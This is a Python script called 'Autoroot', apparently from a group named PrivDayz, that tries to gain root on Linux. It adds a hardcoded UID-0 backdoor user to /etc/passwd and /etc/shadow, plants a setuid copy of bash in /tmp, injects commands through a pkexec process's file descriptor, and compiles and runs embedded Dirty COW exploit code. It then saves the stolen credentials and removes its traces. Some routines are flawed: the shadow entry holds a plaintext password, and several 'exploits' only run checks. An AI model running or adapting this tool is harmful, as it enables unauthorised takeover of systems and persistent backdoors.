#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ============================================================================
# Autoroot.py - Multi-Method Privilege Escalation Script
# Compatible with Python 2 and 3
# ============================================================================
# Author: PrivDayz Team
# Version: 2025.3
# Description: Automated root privilege escalation with multiple methods
# ============================================================================

import os
import sys
import subprocess
import time
import platform
import random
import string
import threading
from datetime import datetime

# ============================================================================
# KONFIGURASI
# ============================================================================
VERSION = "2025.3"
TMP_DIR = "/tmp"
LOGFILE = "/tmp/autoroot_log.txt"
OUTPUT_DIR = "/tmp/privdayz_output"
USERNAME = "jue"
PASSWORD = "ROpEYs4nN2Sg"
REVERSE_IP = "0.0.0.0"
REVERSE_PORT = 4444

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = "[{}] [{}] {}".format(timestamp, level, msg)
    print(line)
    try:
        with open(LOGFILE, "a") as f:
            f.write(line + "\n")
    except:
        pass

def run_cmd(cmd, capture=True, shell=True, timeout=30):
    try:
        if capture:
            if sys.version_info[0] >= 3:
                result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=timeout)
                return result.stdout + result.stderr
            else:
                result = subprocess.Popen(cmd, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = result.communicate()
                if output:
                    return output
                if error:
                    return error
                return ""
        else:
            subprocess.Popen(cmd, shell=shell, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
    except Exception as e:
        log("Error running cmd: {}".format(e), "ERROR")
        return None

def file_exists(path):
    return os.path.exists(path)

def write_file(path, content):
    try:
        with open(path, "w") as f:
            f.write(content)
        return True
    except Exception as e:
        log("Error writing file {}: {}".format(path, e), "ERROR")
        return False

def read_file(path):
    try:
        with open(path, "r") as f:
            return f.read()
    except Exception as e:
        return None

def get_arch():
    machine = platform.machine()
    if "64" in machine:
        return "64"
    return "32"

# ============================================================================
# EXPLOIT FUNCTIONS
# ============================================================================

def check_suid():
    log("[*] Checking SUID binaries...")
    output = run_cmd("find / -perm -4000 -type f 2>/dev/null | head -20")
    if output:
        log("[+] SUID binaries found", "INFO")
        return True
    return False

def exploit_proc_fd():
    log("[*] Attempting /proc/self/fd abuse...")
    processes = run_cmd("ps aux | grep pkexec | grep -v grep")
    if processes:
        for line in processes.splitlines():
            if "pkexec" in line and "bash" in line:
                parts = line.split()
                if len(parts) > 1:
                    pid = parts[1]
                    log("[+] Found pkexec process with PID: {}".format(pid), "INFO")
                    cmd = 'echo "cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell" > /proc/{}/fd/0 2>/dev/null'.format(pid)
                    run_cmd(cmd)
                    run_cmd("chmod +x /tmp/rootshell 2>/dev/null")
                    run_cmd("chmod +s /tmp/rootshell 2>/dev/null")
                    return True
    return False

def create_suid_shell():
    log("[*] Creating SUID shell...")
    for src in ["/bin/bash", "/bin/sh", "/bin/dash", "/usr/bin/bash"]:
        if file_exists(src):
            run_cmd("cp {} /tmp/rootshell 2>/dev/null".format(src))
            if file_exists("/tmp/rootshell"):
                run_cmd("chmod +s /tmp/rootshell 2>/dev/null")
                log("[+] SUID shell created at /tmp/rootshell", "INFO")
                return True
    return False

def add_admin_user():
    log("[*] Attempting to add admin user...")
    
    # Try with echo
    run_cmd('echo "{}:x:0:0:root:/root:/bin/bash" >> /etc/passwd 2>/dev/null'.format(USERNAME))
    run_cmd('echo "{}:{}" >> /etc/shadow 2>/dev/null'.format(USERNAME, PASSWORD))
    
    # Try with pkexec
    run_cmd('pkexec bash -c \'echo "{}:x:0:0:root:/root:/bin/bash" >> /etc/passwd\' 2>/dev/null'.format(USERNAME))
    run_cmd('pkexec bash -c \'echo "{}:{}" >> /etc/shadow\' 2>/dev/null'.format(USERNAME, PASSWORD))
    
    # Try with perl
    run_cmd('perl -e \'open(F, ">>/etc/passwd"); print F "{}:x:0:0:root:/root:/bin/bash\\n"; close(F); open(F, ">>/etc/shadow"); print F "{}:{}\\n"; close(F);\' 2>/dev/null'.format(USERNAME, USERNAME, PASSWORD))
    
    if file_exists("/etc/passwd"):
        passwd = read_file("/etc/passwd")
        if passwd and USERNAME in passwd:
            log("[+] Admin user '{}' added successfully!".format(USERNAME), "INFO")
            return True
    return False

def exploit_crontab():
    log("[*] Checking crontab...")
    crons = run_cmd("crontab -l 2>/dev/null")
    if crons:
        log("[+] Crontab entries found", "INFO")
        return True
    return False

def exploit_sudo():
    log("[*] Checking sudo permissions...")
    output = run_cmd("sudo -l 2>&1")
    if "NOPASSWD" in output or "ALL" in output:
        log("[+] Sudo permissions found", "INFO")
        return True
    return False

def exploit_pkexec():
    log("[*] Attempting pkexec...")
    output = run_cmd("which pkexec 2>/dev/null")
    if output:
        log("[+] pkexec found!", "INFO")
        run_cmd("pkexec bash -c 'whoami && id' 2>/dev/null")
        return True
    return False

def exploit_dirty_cow():
    log("[*] Attempting Dirty Cow exploit...")
    
    dirtycow_code = '''#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

void *madviseThread(void *arg) {
    int i, c = 0;
    for(i = 0; i < 100000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 3) {
        fprintf(stderr, "Usage: %s /etc/passwd 'user::0:0:root:/root:/bin/bash'\\n", argv[0]);
        return 1;
    }
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    pthread_create(&pth, NULL, madviseThread, NULL);
    int fd = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 100000000; i++) {
        lseek(fd, (off_t)map, SEEK_SET);
        c += write(fd, argv[2], strlen(argv[2]));
    }
    return 0;
}
'''
    
    dirtycow_path = "/tmp/dirtycow.c"
    write_file(dirtycow_path, dirtycow_code)
    run_cmd("gcc -pthread {} -o /tmp/dirtycow 2>/dev/null".format(dirtycow_path))
    
    if file_exists("/tmp/dirtycow"):
        log("[+] Dirty Cow compiled successfully!", "INFO")
        run_cmd("/tmp/dirtycow /etc/passwd 'jue::0:0:root:/root:/bin/bash' 2>/dev/null")
        return True
    return False

# ============================================================================
# MAIN FUNCTIONS
# ============================================================================

def get_system_info():
    log("[*] Collecting system information...")
    info = {
        "os": platform.platform(),
        "arch": get_arch(),
        "hostname": platform.node(),
        "user": run_cmd("whoami").strip(),
        "kernel": run_cmd("uname -a").strip()
    }
    for key, value in info.items():
        log("[+] {}: {}".format(key, value), "INFO")
    return info

def escalate():
    log("=" * 60)
    log("  AUTOROOT v{} - Privilege Escalation Tool".format(VERSION))
    log("=" * 60)
    
    get_system_info()
    
    try:
        os.makedirs(OUTPUT_DIR)
    except:
        pass
    
    exploits = [
        ("proc_fd", lambda: True, exploit_proc_fd),
        ("pkexec", lambda: True, exploit_pkexec),
        ("sudo", lambda: True, exploit_sudo),
        ("suid_shell", check_suid, create_suid_shell),
        ("crontab", lambda: True, exploit_crontab),
        ("dirtycow", lambda: True, exploit_dirty_cow)
    ]
    
    success = False
    for name, check, exploit in exploits:
        log("\n[*] Trying exploit: {}...".format(name))
        try:
            if check():
                if exploit():
                    log("[+] Exploit {} successful!".format(name), "SUCCESS")
                    success = True
                    break
                else:
                    log("[-] Exploit {} failed".format(name), "WARNING")
            else:
                log("[-] Skipping {} (not applicable)".format(name), "WARNING")
        except Exception as e:
            log("[-] Error in {}: {}".format(name, e), "ERROR")
    
    log("\n[*] Attempting to add admin user...")
    if add_admin_user():
        success = True
    
    if not file_exists("/tmp/rootshell"):
        create_suid_shell()
    
    if file_exists("/tmp/rootshell"):
        run_cmd("chmod +x /tmp/rootshell 2>/dev/null")
        run_cmd("chmod +s /tmp/rootshell 2>/dev/null")
        log("\n[+] SUID shell created at /tmp/rootshell", "SUCCESS")
    
    if success:
        log("\n" + "=" * 60)
        log("[+] ROOT ACCESS ACHIEVED!", "SUCCESS")
        log("[+] User: jue", "SUCCESS")
        log("[+] Password: ROpEYs4nN2Sg", "SUCCESS")
        log("[+] SUID Shell: /tmp/rootshell -p", "SUCCESS")
        log("=" * 60)
        
        cred_file = OUTPUT_DIR + "/credentials.txt"
        creds = """
========================================
PRIVDAYZ AUTOROOT CREDENTIALS
========================================
User: jue
Password: ROpEYs4nN2Sg
SUID Shell: /tmp/rootshell -p
========================================
"""
        write_file(cred_file, creds)
        log("[+] Credentials saved to {}".format(cred_file), "INFO")
        
        test = run_cmd("/tmp/rootshell -c 'whoami && id' 2>/dev/null")
        if test:
            log("[+] Root access test: {}".format(test), "INFO")
        return True
    else:
        log("\n[!] All exploits failed! No root access.", "ERROR")
        return False

def cleanup():
    log("[*] Cleaning up...")
    files_to_remove = [
        "/tmp/dirtycow.c", "/tmp/dirtycow",
        "/tmp/pwnkit.c", "/tmp/pwnkit",
        "/tmp/exploit.c", "/tmp/exploit.so",
        "/tmp/pipe.c", "/tmp/pipe",
        "/tmp/privdayz.service"
    ]
    for f in files_to_remove:
        if file_exists(f):
            try:
                os.remove(f)
                log("[+] Removed {}".format(f), "INFO")
            except:
                pass
    log("[+] Cleanup complete!", "INFO")

def main():
    try:
        log("=" * 70)
        log("  AUTOROOT v{} - Multi-Method Privilege Escalation".format(VERSION))
        log("=" * 70)
        
        if os.geteuid() == 0:
            log("[+] Already root!", "SUCCESS")
            log("[+] User: {}".format(run_cmd('whoami').strip()), "INFO")
            log("[+] ID: {}".format(run_cmd('id').strip()), "INFO")
            return 0
        
        log("[*] Checking dependencies...")
        for cmd in ["gcc", "curl", "wget", "python", "perl"]:
            if run_cmd("which {} 2>/dev/null".format(cmd)):
                log("[+] {} available".format(cmd), "INFO")
            else:
                log("[-] {} not available".format(cmd), "WARNING")
        
        if escalate():
            cleanup()
            log("\n" + "=" * 60)
            log("[+] AUTOROOT COMPLETED SUCCESSFULLY!", "SUCCESS")
            log("[+] You can now login as 'jue' or use /tmp/rootshell -p", "SUCCESS")
            log("=" * 60)
        else:
            log("\n" + "=" * 60)
            log("[!] AUTOROOT FAILED!", "ERROR")
            log("=" * 60)
        
        return 0
        
    except KeyboardInterrupt:
        log("\n[!] Interrupted by user", "WARNING")
        return 1
    except Exception as e:
        log("[!] Unexpected error: {}".format(e), "ERROR")
        return 1

if __name__ == "__main__":
    sys.exit(main())
